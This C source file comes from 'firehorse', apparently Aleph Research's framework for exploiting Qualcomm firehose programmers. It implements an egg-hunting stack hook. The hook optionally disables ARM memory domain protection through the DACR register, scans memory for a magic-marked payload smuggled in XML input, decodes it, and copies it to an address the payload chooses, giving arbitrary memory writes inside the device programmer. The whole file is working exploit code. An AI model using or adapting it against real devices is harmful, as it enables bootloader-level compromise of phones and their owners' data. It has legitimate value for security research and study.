/*
firehorse
by Roee Hay & Noam Hadad, Aleph Research
*/

#include "fh.h"

#define XMLHUNT_MAGIC_START     (0x223d6866)
#define XMLHUNT_MAGIC_QUOTE     (0x12893793)
#define XMLHUNT_MAGIC_NULL      (0x714298CF)
#define XMLHUNT_MAGIC_ONEAH     (0xAB5CD6FA)

#ifdef XMLHUNT_UART
#define EE(buf) uartB(buf)
#define E(fmt, ...) { char buf[150]; snprintf(buf, sizeof(buf)-1, fmt, __VA_ARGS__); uartB(buf); }
#else
#define EE(buf)
#define E(fmt, ...)
#endif

typedef struct 
{
    u_int32 magic;
    u_int32 dst;
    char payload[];
} __attribute((packed)) xmlhunt_t;


/*
 * XML Hunter
 */
STACKHOOK(dload) {
#if XMLHUNTER_DACR==1
    __asm("MOV R0, #0xFFFFFFFF; MCR p15,0,R0,c3,c0,0;"); //sets the Domain Access Control Register to 0xFFFFFFFF
#endif
    u_int8 *r = XMLHUNT_ADDR_START;
    u_int8 *w = 0;
    void (*uartB)(char *) = ADDR_UARTB_PROGRAMMER;
    int (*snprintf)(char *buf, int size, char *fmt, ...) = ADDR_SNPRINTF_PROGRAMMER;

    E("xmlhunt start: r=%08x", r);
    u_int8 flag = 0;
    xmlhunt_t *egg = NULL;
    u_int8 *dst = NULL;
    u_int32 *start;
    u_int32 *ws;

    // look for XMLHUNT_MAGIC_START and decode following data (in-place)
    while (NULL == egg || r8a(r) != '"')
    {
        E("[r=%08x, w=%08x] = %08x, %02x", r, w, r32a(r), r8a(r));
        
        if (r32a(r) == XMLHUNT_MAGIC_START)
        {
            E("start magic found @ %08x", r);
            r += 4;
            w = (XMLHUNT_WRITE_BUFFER) ? XMLHUNT_WRITE_BUFFER : r;
            egg = (xmlhunt_t *)(w-4);
            E("found magic. egg = %08x", egg);

        }
        if (egg == NULL)
        {
            r++;
            continue;
        }

        // some decoding if needed
        switch (r32a(r))
        {
            case XMLHUNT_MAGIC_QUOTE:
                w8a(w, '"'); r+=4; w++; break;
            case XMLHUNT_MAGIC_NULL:
                w8a(w, '\x00'); r+=4; w++; break; 
            case XMLHUNT_MAGIC_ONEAH:
                w8a(w, '\x1a'); r+=4; w++; break; 

            default:
                w8a(w, r8a(r)); w++; r++; break;
        }
        
    }

    u_int32 size = (u_int32)w - (u_int32)&egg->payload;
    if (egg == NULL)
    {
        EE("error with egg");
        return;
    }

    // copy decoded data to destanation
    E("Copying. 1=%016lx 2=%016lx", &(egg->dst), &egg->dst);
    E("dst = %08x, src= %08x, size = %08x", r32a((u_int8 *)&(egg->dst)), (u_int64)&egg->payload, size);
    memcpya((void *)r32a((u_int8 *)&(egg->dst)),  &egg->payload, size);
        
    EE("xmlhunt done");
}


